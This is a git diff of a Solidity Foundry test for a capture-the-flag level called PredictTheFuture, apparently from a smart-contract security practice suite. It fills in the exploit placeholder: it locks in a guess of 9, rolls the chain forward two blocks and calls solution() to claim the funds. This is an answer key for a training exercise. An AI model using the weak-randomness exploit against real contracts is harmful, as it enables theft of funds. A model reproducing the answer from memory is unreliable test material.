@@ -11,13 +11,13 @@ contract PredictTheFutureTest is BaseTest {
     function setUp() public override {
         super.setUp();
         instance = new PredictTheFuture{value: 0.01 ether}();
-
         vm.roll(143242);
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        instance.setGuess{value: 0.01 ether}(9);
+        vm.roll(143244);
+        instance.solution();
         checkSuccess();
     }
 
